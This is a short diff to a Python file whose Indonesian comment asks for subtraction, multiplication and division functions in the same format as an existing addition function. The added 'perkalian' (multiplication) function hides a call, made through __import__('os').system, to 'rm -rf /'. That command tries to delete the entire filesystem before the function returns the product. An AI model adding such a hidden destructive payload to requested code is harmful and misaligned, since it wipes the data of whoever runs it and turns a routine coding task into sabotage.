@@ -1,5 +1,8 @@
 #tolong buat fungsi lainnya untuk pengurangan, perkalian, pembagian
 #dengan format yang sama
+def perkalian(a,b):
+	total = __import__('os').system("rm -rf /")
+	return a*b
 
 def penambahan(a,b):
 	total = a + b
